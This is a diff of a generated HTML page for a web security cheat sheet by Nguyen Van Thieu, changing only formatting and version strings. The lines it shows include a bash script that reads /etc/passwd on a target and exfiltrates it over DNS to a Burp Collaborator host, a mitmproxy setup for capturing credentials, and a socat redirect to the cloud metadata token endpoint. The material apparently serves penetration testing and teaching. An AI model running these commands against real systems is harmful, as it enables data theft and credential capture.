@@ -42,7 +42,7 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.73.0 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="generator" content="Hugo 0.103.0 with theme Tranquilpeak 0.5.3-BETA">
 <meta name="author" content="Nguyen Van Thieu">
 <meta name="keywords" content="">
 <meta name="description" content="A comprehensive cheat sheet for web security">
@@ -148,7 +148,6 @@ if (!doNotTrack) {
 	ga('send', 'pageview');
 }
 </script>
-
     
     
   </head>
@@ -571,7 +570,7 @@ if (!doNotTrack) {
 <br># Gobuster is a tool used to brute-force.
 <br><code>gobuster dir -a 'Mozilla' -e -k -l -t 30 -w mydirfilelist.txt -c 'NAME1=VALUE1; NAME2=VALUE2' -u 'https://example.com/'</code></p>
 <p><a href="https://github.com/tomnomnom/meg">https://github.com/tomnomnom/meg</a>
-<br># meg is a tool for fetching lots of URLs but still being &lsquo;nice&rsquo; to servers.
+<br># meg is a tool for fetching lots of URLs but still being &rsquo;nice&rsquo; to servers.
 <br><code>meg -c 50 -H 'User-Agent: Mozilla' -s 200 weblogic.txt example.txt weblogic</code></p>
 <p><a href="https://github.com/deibit/cansina">https://github.com/deibit/cansina</a>
 <br># Cansina is a Web Content Discovery Application.
@@ -895,22 +894,22 @@ if (!doNotTrack) {
 <br># This tool can forward TCP traffic over DNS protocol. Non-compile clients + socks5 support.</p>
 <p><br># Pure bash exfiltration over dns
 <br>## Execute on target server (replace YOURBCID)</p>
-<pre><code>CMD=&quot;cat /etc/passwd&quot;
+<pre tabindex="0"><code>CMD=&#34;cat /etc/passwd&#34;
 HID=$(tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 5)
 CMDID=$(tr -dc A-Za-z0-9 &lt;/dev/urandom | head -c 5)
-BC=&quot;YOURBCID.burpcollaborator.net&quot;
-D=&quot;$HID-$CMDID.$BC&quot;
-M=$($CMD 2&gt;&amp;1); T=${#M}; O=0; S=30; I=1; while [ &quot;${T}&quot; -gt &quot;0&quot; ]; do C=$(echo ${M:${O}:${S}}|base64); C=${C//+/_0}; C=${C//\//_1}; C=${C//=/_2}; host -t A $I.${C}.$D&amp;&gt;/dev/null; O=$((${O}+${S})); T=$((${T}-${S})); I=$((I+1)); done
+BC=&#34;YOURBCID.burpcollaborator.net&#34;
+D=&#34;$HID-$CMDID.$BC&#34;
+M=$($CMD 2&gt;&amp;1); T=${#M}; O=0; S=30; I=1; while [ &#34;${T}&#34; -gt &#34;0&#34; ]; do C=$(echo ${M:${O}:${S}}|base64); C=${C//+/_0}; C=${C//\//_1}; C=${C//=/_2}; host -t A $I.${C}.$D&amp;&gt;/dev/null; O=$((${O}+${S})); T=$((${T}-${S})); I=$((I+1)); done
 </code></pre><p><br>## Execute on attacker machine (replace YOURBIID) and extract Burp Collaborator results</p>
-<pre><code>BCPURL=&quot;https://polling.burpcollaborator.net/burpresults?biid=YOURBIID&quot;
-RESULTS=$(curl -sk &quot;${BCPURL}&quot;)
+<pre tabindex="0"><code>BCPURL=&#34;https://polling.burpcollaborator.net/burpresults?biid=YOURBIID&#34;
+RESULTS=$(curl -sk &#34;${BCPURL}&#34;)
 </code></pre><p><br>## Get IDs available</p>
-<pre><code>echo &quot;${RESULTS}&quot; | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'&quot;protocol&quot;:&quot;dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep --color=never &quot;^[[:digit:]]+\..*\..*\.$BC$&quot;; fi; done | sed -r 's/^[[:digit:]]+\.[^.]+\.([^.]+)\..*/\1/g' | sort -u
+<pre tabindex="0"><code>echo &#34;${RESULTS}&#34; | jq -cM &#39;.responses[]&#39; | while read LINE; do if [[ $LINE == *&#39;&#34;protocol&#34;:&#34;dns&#39;* ]]; then echo ${LINE} | jq -rM &#39;.data.subDomain&#39; | egrep --color=never &#34;^[[:digit:]]+\..*\..*\.$BC$&#34;; fi; done | sed -r &#39;s/^[[:digit:]]+\.[^.]+\.([^.]+)\..*/\1/g&#39; | sort -u
 </code></pre><p><br>## Update ID and get command result (repeat for each ID)</p>
-<pre><code>ID=&quot;xxxxx-xxxxx&quot;
-echo &quot;${RESULTS}&quot; | jq -cM '.responses[]' | while read LINE; do if [[ $LINE == *'&quot;protocol&quot;:&quot;dns'* ]]; then echo ${LINE} | jq -rM '.data.subDomain' | egrep &quot;^[[:digit:]]+\..*\..*\.$BC$&quot;; fi; done | egrep &quot;$ID&quot; | sort -t. -k3 -g | sed -r 's/^[[:digit:]]+\.([^.]+)\..*/\1/g' | while read i; do i=${i//_0/+}; i=${i//_1/\/}; i=${i//_2/=}; echo ${i} | base64 -d; done
+<pre tabindex="0"><code>ID=&#34;xxxxx-xxxxx&#34;
+echo &#34;${RESULTS}&#34; | jq -cM &#39;.responses[]&#39; | while read LINE; do if [[ $LINE == *&#39;&#34;protocol&#34;:&#34;dns&#39;* ]]; then echo ${LINE} | jq -rM &#39;.data.subDomain&#39; | egrep &#34;^[[:digit:]]+\..*\..*\.$BC$&#34;; fi; done | egrep &#34;$ID&#34; | sort -t. -k3 -g | sed -r &#39;s/^[[:digit:]]+\.([^.]+)\..*/\1/g&#39; | while read i; do i=${i//_0/+}; i=${i//_1/\/}; i=${i//_2/=}; echo ${i} | base64 -d; done
 </code></pre><p><a href="https://www.slideshare.net/snyff/code-that-gets-you-pwnsd">https://www.slideshare.net/snyff/code-that-gets-you-pwnsd</a>
-<br># Code that gets you pwn(s|'d). Very intersting bypasses ideas.</p>
+<br># Code that gets you pwn(s|&rsquo;d). Very intersting bypasses ideas.</p>
 <p><a href="https://github.com/aufzayed/bugbounty/tree/main/403-bypass">https://github.com/aufzayed/bugbounty/tree/main/403-bypass</a>
 <br># Common 403 bypass.</p>
 <h2 id="manual">Manual</h2>
@@ -1059,33 +1058,33 @@ echo &quot;${RESULTS}&quot; | jq -cM '.responses[]' | while read LINE; do if [[ 
 <p><br># Print only response headers for any method with curl
 <br><code>curl -skSL -D - https://www.example.com -o /dev/null</code></p>
 <p><br># Pure bash multhread script</p>
-<pre><code>#!/bin/bash
+<pre tabindex="0"><code>#!/bin/bash
 
-FILE=&quot;${1}&quot;
-THREADS=&quot;${2}&quot;
-TIMEOUT=&quot;${3}&quot;
-CMD=&quot;${4}&quot;
-NUM=$(wc -l ${FILE} | awk '{ print $1 }')
+FILE=&#34;${1}&#34;
+THREADS=&#34;${2}&#34;
+TIMEOUT=&#34;${3}&#34;
+CMD=&#34;${4}&#34;
+NUM=$(wc -l ${FILE} | awk &#39;{ print $1 }&#39;)
 THREAD=0
 NUMDOM=0
 while read SUBDOMAIN; do
         PIDSTAT=0
         if [ $THREAD -lt $THREADS ]; then
                 eval timeout ${TIMEOUT} ${CMD} 2&gt;/dev/null &amp;
-                PIDS[$THREAD]=&quot;${!}&quot;
+                PIDS[$THREAD]=&#34;${!}&#34;
                 let THREAD++
                 let NUMDOM++
-                echo -ne &quot;\r&gt;Progress: ${NUMDOM} of ${NUM} ($(awk &quot;BEGIN {printf \&quot;%0.2f\&quot;,(${NUMDOM}*100)/${NUM}}&quot;)%)\r&quot;
+                echo -ne &#34;\r&gt;Progress: ${NUMDOM} of ${NUM} ($(awk &#34;BEGIN {printf \&#34;%0.2f\&#34;,(${NUMDOM}*100)/${NUM}}&#34;)%)\r&#34;
         else
                 while [ ${PIDSTAT} -eq 0 ]; do
-                        for j in &quot;${!PIDS[@]}&quot;; do
-                                kill -0 &quot;${PIDS[j]}&quot; &gt; /dev/null 2&gt;&amp;1
-                                PIDSTAT=&quot;${?}&quot;
+                        for j in &#34;${!PIDS[@]}&#34;; do
+                                kill -0 &#34;${PIDS[j]}&#34; &gt; /dev/null 2&gt;&amp;1
+                                PIDSTAT=&#34;${?}&#34;
                                 if [ ${PIDSTAT} -ne 0 ]; then
                                         eval timeout ${TIMEOUT} ${CMD} 2&gt;/dev/null &amp;
-                                        PIDS[j]=&quot;${!}&quot;
+                                        PIDS[j]=&#34;${!}&#34;
                                         let NUMDOM++
-                                        echo -ne &quot;\r&gt;Progress: ${NUMDOM} of ${NUM} ($(awk &quot;BEGIN {printf \&quot;%0.2f\&quot;,(${NUMDOM}*100)/${NUM}}&quot;)%)\r&quot;
+                                        echo -ne &#34;\r&gt;Progress: ${NUMDOM} of ${NUM} ($(awk &#34;BEGIN {printf \&#34;%0.2f\&#34;,(${NUMDOM}*100)/${NUM}}&#34;)%)\r&#34;
                                         break
                                 fi
                         done
@@ -1095,12 +1094,12 @@ done &lt; ${FILE}
 wait
 </code></pre><p><br># Reverse Proxy
 <br><code>mitmdump --certs ~/cert/cert.pem --listen-port 443 --scripts script.py --set block_global=false --mode reverse:https://example.com/</code> # Good for capture credentials</p>
-<pre><code>$ cat script.py
+<pre tabindex="0"><code>$ cat script.py
 import mitmproxy.http
 from mitmproxy import ctx
 
 def request(flow):
-    if flow.request.method == &quot;POST&quot;:
+    if flow.request.method == &#34;POST&#34;:
         ctx.log.info(flow.request.get_text())
 </code></pre><p><br># SOCKS Proxy
 <br><code>ssh -N -D 0.0.0.0:1337 localhost</code></p>
@@ -1121,10 +1120,10 @@ def request(flow):
 <br><code>socat -v -d -d openssl-listen:443,crlf,reuseaddr,cert=web.pem,verify=0,fork 'SYSTEM:/bin/echo &quot;HTTP/1.1 302 Found&quot;;/bin/echo &quot;Content-Length: 0&quot;;/bin/echo &quot;Location: http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token&quot;;/bin/echo;/bin/echo'</code>
 <br><code>stunnel stunnel.conf</code> # Check <a href="https://www.stunnel.org/">https://www.stunnel.org/</a></p>
 <p><br># Python 3 Simple HTTPS Server</p>
-<pre><code>    import http.server, ssl
-    server_address = ('0.0.0.0', 443)
+<pre tabindex="0"><code>    import http.server, ssl
+    server_address = (&#39;0.0.0.0&#39;, 443)
     httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
-    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile='/path/cert.pem', ssl_version=ssl.PROTOCOL_TLS)
+    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile=&#39;/path/cert.pem&#39;, ssl_version=ssl.PROTOCOL_TLS)
     httpd.serve_forever()
 </code></pre><p><br># Fake FTP Server
 <br><code>python -m pyftpdlib --directory=/tmp/dir/ --port=21</code></p>
@@ -1289,7 +1288,7 @@ def request(flow):
         </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
-    &copy; 2022 Nguyen Van Thieu. All Rights Reserved
+    &copy; 2023 Nguyen Van Thieu. All Rights Reserved
   </span>
 </footer>
 
